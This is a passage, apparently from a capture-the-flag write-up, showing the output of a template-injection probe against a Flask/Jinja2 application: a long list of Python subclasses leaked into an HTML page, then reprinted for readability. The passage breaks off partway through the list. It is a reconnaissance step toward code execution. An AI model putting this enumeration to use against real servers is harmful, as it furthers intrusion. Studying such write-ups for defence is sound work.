&#39;_ast.AST&#39;&gt;, &lt;class &#39;_json.Scanner&#39;&gt;, &lt;class &#39;_json.Encoder&#39;&gt;, &lt;class &#39;json.decoder.JSONDecoder&#39;&gt;, &lt;class &#39;json.encoder.JSONEncoder&#39;&gt;, &lt;class &#39;jinja2.utils.MissingType&#39;&gt;, &lt;class &#39;jinja2.utils.LRUCache&#39;&gt;, &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &lt;class &#39;jinja2.utils.Namespace&#39;&gt;, &lt;class &#39;markupsafe._MarkupEscapeHelper&#39;&gt;, &lt;class &#39;jinja2.nodes.EvalContext&#39;&gt;, &lt;class &#39;jinja2.nodes.Node&#39;&gt;, &lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;jinja2.runtime.Context&#39;&gt;, &lt;class &#39;jinja2.runtime.BlockReference&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContextBase&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContextIterator&#39;&gt;, &lt;class &#39;jinja2.runtime.Macro&#39;&gt;, &lt;class &#39;jinja2.runtime.Undefined&#39;&gt;, &lt;class &#39;decimal.Decimal&#39;&gt;, &lt;class &#39;decimal.Context&#39;&gt;, &lt;class &#39;decimal.SignalDictMixin&#39;&gt;, &lt;class &#39;decimal.ContextManager&#39;&gt;, &lt;class &#39;numbers.Number&#39;&gt;, &lt;class &#39;jinja2.lexer.Failure&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStreamIterator&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStream&#39;&gt;, &lt;class &#39;jinja2.lexer.Lexer&#39;&gt;, &lt;class &#39;jinja2.parser.Parser&#39;&gt;, &lt;class &#39;jinja2.visitor.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.idtracking.Symbols&#39;&gt;, &lt;class &#39;jinja2.compiler.MacroRef&#39;&gt;, &lt;class &#39;jinja2.compiler.Frame&#39;&gt;, &lt;class &#39;jinja2.environment.Environment&#39;&gt;, &lt;class &#39;jinja2.environment.Template&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateModule&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateExpression&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateStream&#39;&gt;, &lt;class &#39;jinja2.loaders.BaseLoader&#39;&gt;, &lt;class &#39;jinja2.bccache.Bucket&#39;&gt;, &lt;class &#39;jinja2.bccache.BytecodeCache&#39;&gt;, &lt;class &#39;jinja2.asyncsupport.AsyncLoopContextIterator&#39;&gt;, &lt;class &#39;werkzeug._internal._Missing&#39;&gt;, &lt;class &#39;werkzeug._internal._DictAccessorProperty&#39;&gt;, &lt;class &#39;werkzeug.utils.HTMLBuilder&#39;&gt;, &lt;class &#39;werkzeug.exceptions.Aborter&#39;&gt;, &lt;class &#39;werkzeug.urls.Href&#39;&gt;, &lt;class &#39;email.message.Message&#39;&gt;, &lt;class &#39;http.client.HTTPConnection&#39;&gt;, &lt;class &#39;mimetypes.MimeTypes&#39;&gt;, &lt;class &#39;werkzeug.serving.WSGIRequestHandler&#39;&gt;, &lt;class &#39;werkzeug.serving._SSLContext&#39;&gt;, &lt;class &#39;werkzeug.serving.BaseWSGIServer&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableListMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.UpdateDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ViewItems&#39;&gt;, &lt;class &#39;werkzeug.datastructures._omd_bucket&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Headers&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableHeadersMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.IfRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Range&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ContentRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.FileStorage&#39;&gt;, &lt;class &#39;urllib.request.Request&#39;&gt;, &lt;class &#39;urllib.request.OpenerDirector&#39;&gt;, &lt;class &#39;urllib.request.BaseHandler&#39;&gt;, &lt;class &#39;urllib.request.HTTPPasswordMgr&#39;&gt;, &lt;class &#39;urllib.request.AbstractBasicAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.AbstractDigestAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.URLopener&#39;&gt;, &lt;class &#39;urllib.request.ftpwrapper&#39;&gt;, &lt;class &#39;werkzeug.wrappers.accept.AcceptMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.AuthorizationMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&#39;&gt;, &lt;class &#39;werkzeug.wsgi.ClosingIterator&#39;&gt;, &lt;class &#39;werkzeug.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;werkzeug.wsgi._RangeWrapper&#39;&gt;, &lt;class &#39;werkzeug.formparser.FormDataParser&#39;&gt;, &lt;class &#39;werkzeug.formparser.MultiPartParser&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_request.BaseRequest&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_response.BaseResponse&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgentParser&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgent&#39;&gt;, &lt;class &#39;werkzeug.wrappers.user_agent.UserAgentMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.request.StreamOnlyMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStream&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStreamMixin&#39;&gt;, &lt;class &#39;http.cookiejar.Cookie&#39;&gt;, &lt;class &#39;http.cookiejar.CookiePolicy&#39;&gt;, &lt;class &#39;http.cookiejar.Absent&#39;&gt;, &lt;class &#39;http.cookiejar.CookieJar&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieHeaders&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieResponse&#39;&gt;, &lt;class &#39;werkzeug.test.EnvironBuilder&#39;&gt;, &lt;class &#39;werkzeug.test.Client&#39;&gt;, &lt;class &#39;uuid.UUID&#39;&gt;, &lt;class &#39;itsdangerous._json._CompactJSON&#39;&gt;, &lt;class &#39;hmac.HMAC&#39;&gt;, &lt;class &#39;itsdangerous.signer.SigningAlgorithm&#39;&gt;, &lt;class &#39;itsdangerous.signer.Signer&#39;&gt;, &lt;class &#39;itsdangerous.serializer.Serializer&#39;&gt;, &lt;class &#39;itsdangerous.url_safe.URLSafeSerializerMixin&#39;&gt;, &lt;class &#39;flask._compat._DeprecatedBool&#39;&gt;, &lt;class &#39;greenlet.greenlet&#39;&gt;, &lt;class &#39;werkzeug.local.Local&#39;&gt;, &lt;class &#39;werkzeug.local.LocalStack&#39;&gt;, &lt;class &#39;werkzeug.local.LocalManager&#39;&gt;, &lt;class &#39;werkzeug.local.LocalProxy&#39;&gt;, &lt;class &#39;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#39;&gt;, &lt;class &#39;dataclasses._MISSING_TYPE&#39;&gt;, &lt;class &#39;dataclasses._FIELD_BASE&#39;&gt;, &lt;class &#39;dataclasses.InitVar&#39;&gt;, &lt;class &#39;dataclasses.Field&#39;&gt;, &lt;class &#39;dataclasses._DataclassParams&#39;&gt;, &lt;class &#39;ast.NodeVisitor&#39;&gt;, &lt;class &#39;difflib.SequenceMatcher&#39;&gt;, &lt;class &#39;difflib.Differ&#39;&gt;, &lt;class &#39;difflib.HtmlDiff&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleFactory&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleTemplate&#39;&gt;, &lt;class &#39;werkzeug.routing.BaseConverter&#39;&gt;, &lt;class &#39;werkzeug.routing.Map&#39;&gt;, &lt;class &#39;werkzeug.routing.MapAdapter&#39;&gt;, &lt;class &#39;click._compat._FixupStream&#39;&gt;, &lt;class &#39;click._compat._AtomicFile&#39;&gt;, &lt;class &#39;click.utils.LazyFile&#39;&gt;, &lt;class &#39;click.utils.KeepOpenFile&#39;&gt;, &lt;class &#39;click.utils.PacifyFlushWrapper&#39;&gt;, &lt;class &#39;click.types.ParamType&#39;&gt;, &lt;class &#39;click.parser.Option&#39;&gt;, &lt;class &#39;click.parser.Argument&#39;&gt;, &lt;class &#39;click.parser.ParsingState&#39;&gt;, &lt;class &#39;click.parser.OptionParser&#39;&gt;, &lt;class &#39;click.formatting.HelpFormatter&#39;&gt;, &lt;class &#39;click.core.Context&#39;&gt;, &lt;class &#39;click.core.BaseCommand&#39;&gt;, &lt;class &#39;click.core.Parameter&#39;&gt;, &lt;class &#39;flask.signals.Namespace&#39;&gt;, &lt;class &#39;flask.signals._FakeSignal&#39;&gt;, &lt;class &#39;flask.helpers.locked_cached_property&#39;&gt;, &lt;class &#39;flask.helpers._PackageBoundObject&#39;&gt;, &lt;class &#39;flask.cli.DispatchingApp&#39;&gt;, &lt;class &#39;flask.cli.ScriptInfo&#39;&gt;, &lt;class &#39;flask.config.ConfigAttribute&#39;&gt;, &lt;class &#39;flask.ctx._AppCtxGlobals&#39;&gt;, &lt;class &#39;flask.ctx.AppContext&#39;&gt;, &lt;class &#39;flask.ctx.RequestContext&#39;&gt;, &lt;class &#39;flask.json.tag.JSONTag&#39;&gt;, &lt;class &#39;flask.json.tag.TaggedJSONSerializer&#39;&gt;, &lt;class &#39;flask.sessions.SessionInterface&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json._JSONModule&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json.JSONMixin&#39;&gt;, &lt;class &#39;flask.blueprints.BlueprintSetupState&#39;&gt;, &lt;class &#39;typing._Final&#39;&gt;, &lt;class &#39;typing._Immutable&#39;&gt;, &lt;class &#39;typing.Generic&#39;&gt;, &lt;class &#39;typing._TypingEmpty&#39;&gt;, &lt;class &#39;typing._TypingEllipsis&#39;&gt;, &lt;class &#39;typing.NamedTuple&#39;&gt;, &lt;class &#39;typing.io&#39;&gt;, &lt;class &#39;typing.re&#39;&gt;, &lt;class &#39;six._LazyDescr&#39;&gt;, &lt;class &#39;six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.AsymmetricSignatureContext&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.AsymmetricVerificationContext&#39;&gt;, &lt;class &#39;unicodedata.UCD&#39;&gt;, &lt;class &#39;asn1crypto.util.extended_date&#39;&gt;, &lt;class &#39;asn1crypto.util.extended_datetime&#39;&gt;, &lt;class &#39;CArgObject&#39;&gt;, &lt;class &#39;_ctypes.CThunkObject&#39;&gt;, &lt;class &#39;_ctypes._CData&#39;&gt;, &lt;class &#39;_ctypes.CField&#39;&gt;, &lt;class &#39;_ctypes.DictRemover&#39;&gt;, &lt;class &#39;ctypes.CDLL&#39;&gt;, &lt;class &#39;ctypes.LibraryLoader&#39;&gt;, &lt;class &#39;asn1crypto.core.Asn1Value&#39;&gt;, &lt;class &#39;asn1crypto.core.ValueMap&#39;&gt;, &lt;class &#39;asn1crypto.core.Castable&#39;&gt;, &lt;class &#39;asn1crypto.core.Constructable&#39;&gt;, &lt;class &#39;asn1crypto.core.Concat&#39;&gt;, &lt;class &#39;asn1crypto.core.BitString&#39;&gt;, &lt;class &#39;asn1crypto.algos._ForceNullParameters&#39;&gt;, &lt;class &#39;cryptography.utils._DeprecatedValue&#39;&gt;, &lt;class &#39;cryptography.utils._ModuleWithDeprecations&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.CipherBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.HashBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.HMACBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.CMACBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.PBKDF2HMACBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.RSABackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.DSABackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.EllipticCurveBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.PEMSerializationBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.DERSerializationBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.X509Backend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.DHBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.ScryptBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.HashAlgorithm&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.HashContext&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.ExtendableOutputFunction&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.Hash&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA512_224&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA512_256&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA224&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA256&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA384&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA512&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA3_224&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA3_256&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA3_384&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA3_512&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHAKE128&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHAKE256&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.MD5&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.BLAKE2b&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.BLAKE2s&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.utils.Prehashed&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.serialization.base.KeySerializationEncryption&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.serialization.base.BestAvailableEncryption&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.serialization.base.NoEncryption&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAParameters&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAPrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAPublicKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAParameterNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAPublicNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAPrivateNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat._oid.ObjectIdentifier&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurveOID&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurve&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurveSignatureAlgorithm&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT571R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT409R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT283R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT233R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT163R2&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT571K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT409K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT283K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT233K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT163K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP521R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP384R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP256R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP256K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP224R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP192R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP256R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP384R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP512R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.ECDSA&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePrivateNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.ECDH&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ed25519.Ed25519PublicKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ed25519.Ed25519PrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.AsymmetricPadding&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.PKCS1v15&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.PSS&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.OAEP&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.MGF1&#39;&gt;, &lt;class &#39;jwt.algorithms.Algorithm&#39;&gt;, &lt;class &#39;jwt.api_jws.PyJWS&#39;&gt;, &lt;class &#39;jinja2.ext.Extension&#39;&gt;, &lt;class &#39;jinja2.ext._CommentFinder&#39;&gt;, &lt;class &#39;jinja2.debug.TracebackFrameProxy&#39;&gt;, &lt;class &#39;jinja2.debug.ProcessedTraceback&#39;&gt;]</span></h1>
	</div>
</body>

<script src=""/static/js/snow.js""></script>
```

Here the list of classes in a more readable way.

```python
[<class 'type'>, 
<class 'weakref'>, 
<class 'weakcallableproxy'>, 
<class 'weakproxy'>, 
<class 'int'>, 
<class 'bytearray'>, 
<class 'bytes'>, 
<class 'list'>, 
<class 'NoneType'>, 
<class 'NotImplementedType'>, 
<class 'traceback'>, 
<class 'super'>, 
<class 'range'>, 
<class 'dict'>, 
<class 'dict_keys'>, 
<class 'dict_values'>, 
<class 'dict_items'>, 
<class 'odict_iterator'>, 
<class 'set'>, 
<class 'str'>, 
<class 'slice'>, 
<class 'staticmethod'>, 
<class 'complex'>, 
<class 'float'>, 
<class 'frozenset'>, 
<class 'property'>, 
<class 'managedbuffer'>, 
<class 'memoryview'>, 
<class 'tuple'>, 
<class 'enumerate'>, 
<class 'reversed'>, 
<class 'stderrprinter'>, 
<class 'code'>, 
<class 'frame'>, 
<class 'builtin_function_or_method'>, 
<class 'method'>, 
<class 'function'>, 
<class 'mappingproxy'>, 
<class 'generator'>, 
<class 'getset_descriptor'>, 
<class 'wrapper_descriptor'>, 
<class 'method-wrapper'>, 
<class 'ellipsis'>, 
<class 'member_descriptor'>, 
<class 'types.SimpleNamespace'>, 
<class 'PyCapsule'>, 
<class 'longrange_iterator'>, 
<class 'cell'>, 
<class 'instancemethod'>, 
<class 'classmethod_descriptor'>, 
<class 'method_descriptor'>, 
<class 'callable_iterator'>, 
<class 'iterator'>, 
<class 'coroutine'>, 
<class 'coroutine_wrapper'>, 
<class 'moduledef'>, 
<class 'module'>, 
<class 'EncodingMap'>, 
<class 'fieldnameiterator'>, 
<class 'formatteriterator'>, 
<class 'filter'>, 
<class 'map'>, 
<class 'zip'>, 
<class 'BaseException'>, 
<class 'hamt'>, 
<class 'hamt_array_node'>, 
<class 'hamt_bitmap_node'>, 
<class 'hamt_collision_node'>, 
<class 'keys'>, 
<class 'values'>, 
<class 'items'>, 
<class 'Context'>, 
<class 'ContextVar'>, 
<class 'Token'>, 
<class 'Token.MISSING'>, 
<class '_frozen_importlib._ModuleLock'>, 
<class '_frozen_importlib._DummyModuleLock'>, 
<class '_frozen_importlib._ModuleLockManager'>, 
<class '_frozen_importlib._installed_safely'>, 
<class '_frozen_importlib.ModuleSpec'>, 
<class '_frozen_importlib.BuiltinImporter'>, 
<class 'classmethod'>, 
<class '_frozen_importlib.FrozenImporter'>, 
<class '_frozen_importlib._ImportLockContext'>, 
<class '_thread._localdummy'>, 
<class '_thread._local'>, 
<class '_thread.lock'>, 
<class '_thread.RLock'>, 
<class 'zipimport.zipimporter'>, 
<class '_frozen_importlib_external.WindowsRegistryFinder'>, 
<class '_frozen_importlib_external._LoaderBasics'>, 
<class '_frozen_importlib_external.FileLoader'>, 
<class '_frozen_importlib_external._NamespacePath'>, 
<class '_frozen_importlib_external._NamespaceLoader'>, 
<class '_frozen_importlib_external.PathFinder'>, 
<class '_frozen_importlib_external.FileFinder'>, 
<class '_io._IOBase'>, 
<class '_io._BytesIOBuffer'>, 
<class '_io.IncrementalNewlineDecoder'>, 
<class 'posix.ScandirIterator'>, 
<class 'posix.DirEntry'>, 
<class 'codecs.Codec'>, 
<class 'codecs.IncrementalEncoder'>, 
<class 'codecs.IncrementalDecoder'>, 
<class 'codecs.StreamReaderWriter'>, 
<class 'codecs.StreamRecoder'>, 
<class '_abc_data'>, 
<class 'abc.ABC'>, 
<class 'dict_itemiterator'>, 
<class 'collections.abc.Hashable'>, 
<class 'collections.abc.Awaitable'>, 
<class 'collections.abc.AsyncIterable'>, 
<class 'async_generator'>, 
<class 'collections.abc.Iterable'>, 
<class 'bytes_iterator'>, 
<class 'bytearray_iterator'>, 
<class 'dict_keyiterator'>, 
<class 'dict_valueiterator'>, 
<class 'list_iterator'>, 
<class 'list_reverseiterator'>, 
<class 'range_iterator'>, 
<class 'set_iterator'>, 
<class 'str_iterator'>, 
<class 'tuple_iterator'>, 
<class 'collections.abc.Sized'>, 
<class 'collections.abc.Container'>, 
<class 'collections.abc.Callable'>, 
<class 'os._wrap_close'>, 
<class '_sitebuiltins.Quitter'>, 
<class '_sitebuiltins._Printer'>, 
<class '_sitebuiltins._Helper'>, 
<class 'types.DynamicClassAttribute'>, 
<class 'types._GeneratorWrapper'>, 
<class 'collections.deque'>, 
<class '_collections._deque_iterator'>, 
<class '_collections._deque_reverse_iterator'>, 
<class 'enum.auto'>, 
<enum 'Enum'>, 
<class 're.Pattern'>, 
<class 're.Match'>, 
<class '_sre.SRE_Scanner'>, 
<class 'sre_parse.Pattern'>, 
<class 'sre_parse.SubPattern'>, 
<class 'sre_parse.Tokenizer'>, 
<class 'functools.partial'>, 
<class 'functools._lru_cache_wrapper'>, 
<class 'operator.itemgetter'>, 
<class 'operator.attrgetter'>, 
<class 'operator.methodcaller'>, 
<class 'itertools.accumulate'>, 
<class 'itertools.combinations'>, 
<class 'itertools.combinations_with_replacement'>, 
<class 'itertools.cycle'>, 
<class 'itertools.dropwhile'>, 
<class 'itertools.takewhile'>, 
<class 'itertools.islice'>, 
<class 'itertools.starmap'>, 
<class 'itertools.chain'>, 
<class 'itertools.compress'>, 
<class 'itertools.filterfalse'>, 
<class 'itertools.count'>, 
<class 'itertools.zip_longest'>, 
<class 'itertools.permutations'>, 
<class 'itertools.product'>, 
<class 'itertools.repeat'>, 
<class 'itertools.groupby'>, 
<class 'itertools._grouper'>, 
<class 'itertools._tee'>, 
<class 'itertools._tee_dataobject'>, 
<class 'reprlib.Repr'>, 
<class 'collections._Link'>, 
<class 'functools.partialmethod'>, 
<class 're.Scanner'>, 
<class '__future__._Feature'>, 
<class 'warnings.WarningMessage'>, 
<class 'warnings.catch_warnings'>, 
<class 'importlib.abc.Finder'>, 
<class 'importlib.abc.Loader'>, 
<class 'importlib.abc.ResourceReader'>, 
<class 'contextlib.ContextDecorator'>, 
<class 'contextlib._GeneratorContextManagerBase'>, 
<class 'contextlib._BaseExitStack'>, 
<class 'zlib.Compress'>, 
<class 'zlib.Decompress'>, 
<class 'tokenize.Untokenizer'>, 
<class 'traceback.FrameSummary'>, 
<class 'traceback.TracebackException'>, 
<class '_weakrefset._IterationGuard'>, 
<class '_weakrefset.WeakSet'>, 
<class 'threading._RLock'>, 
<class 'threading.Condition'>, 
<class 'threading.Semaphore'>, 
<class 'threading.Event'>, 
<class 'threading.Barrier'>, 
<class 'threading.Thread'>, 
<class '_bz2.BZ2Compressor'>, 
<class '_bz2.BZ2Decompressor'>, 
<class '_lzma.LZMACompressor'>, 
<class '_lzma.LZMADecompressor'>, 
<class 'Struct'>, 
<class 'unpack_iterator'>, 
<class 'zipfile.ZipInfo'>, 
<class 'zipfile.LZMACompressor'>, 
<class 'zipfile.LZMADecompressor'>, 
<class 'zipfile._SharedFile'>, 
<class 'zipfile._Tellable'>, 
<class 'zipfile.ZipFile'>, 
<class 'weakref.finalize._Info'>, 
<class 'weakref.finalize'>, 
<class 'pkgutil.ImpImporter'>, 
<class 'pkgutil.ImpLoader'>, 
<class 'select.poll'>, 
<class 'select.epoll'>, 
<class 'selectors.BaseSelector'>, 
<class 'subprocess.CompletedProcess'>, 
<class 'subprocess.Popen'>, 
<class 'datetime.date'>, 
<class 'datetime.timedelta'>, 
<class 'datetime.time'>, 
<class 'datetime.tzinfo'>, 
<class 'pyexpat.xmlparser'>, 
<class 'plistlib.Data'>, 
<class 'plistlib._PlistParser'>, 
<class 'plistlib._DumbXMLWriter'>, 
<class 'plistlib._BinaryPlistParser'>, 
<class 'plistlib._BinaryPlistWriter'>, 
<class 'string.Template'>, 
<class 'string.Formatter'>, 
<class 'email.charset.Charset'>, 
<class 'email.header.Header'>, 
<class 'email.header._ValueFormatter'>, 
<class '_hashlib.HASH'>, 
<class '_blake2.blake2b'>, 
<class '_blake2.blake2s'>, 
<class '_sha3.sha3_224'>, 
<class '_sha3.sha3_256'>, 
<class '_sha3.sha3_384'>, 
<class '_sha3.sha3_512'>, 
<class '_sha3.shake_128'>, 
<class '_sha3.shake_256'>, 
<class '_random.Random'>, 
<class '_socket.socket'>, 
<class 'urllib.parse._ResultMixinStr'>, 
<class 'urllib.parse._ResultMixinBytes'>, 
<class 'urllib.parse._NetlocResultMixinBase'>, 
<class 'calendar._localized_month'>, 
<class 'calendar._localized_day'>, 
<class 'calendar.Calendar'>, 
<class 'calendar.different_locale'>, 
<class 'email._parseaddr.AddrlistClass'>, 
<class 'email._policybase._PolicyBase'>, 
<class 'email.feedparser.BufferedSubFile'>, 
<class 'email.feedparser.FeedParser'>, 
<class 'email.parser.Parser'>, 
<class 'email.parser.BytesParser'>, 
<class 'tempfile._RandomNameSequence'>, 
<class 'tempfile._TemporaryFileCloser'>, 
<class 'tempfile._TemporaryFileWrapper'>, 
<class 'tempfile.SpooledTemporaryFile'>, 
<class 'tempfile.TemporaryDirectory'>, 
<class 'textwrap.TextWrapper'>, 
<class 'dis.Bytecode'>, 
<class 'inspect.BlockFinder'>, 
<class 'inspect._void'>, 
<class 'inspect._empty'>, 
<class 'inspect.Parameter'>, 
<class 'inspect.BoundArguments'>, 
<class 'inspect.Signature'>, 
<class 'pkg_resources.extern.VendorImporter'>, 
<class 'pkg_resources._vendor.six._LazyDescr'>, 
<class 'pkg_resources._vendor.six._SixMetaPathImporter'>, 
<class 'pkg_resources._vendor.six._LazyDescr'>, 
<class 'pkg_resources._vendor.six._SixMetaPathImporter'>, 
<class 'pkg_resources._vendor.appdirs.AppDirs'>, 
<class 'pkg_resources.extern.packaging._structures.Infinity'>, 
<class 'pkg_resources.extern.packaging._structures.NegativeInfinity'>, 
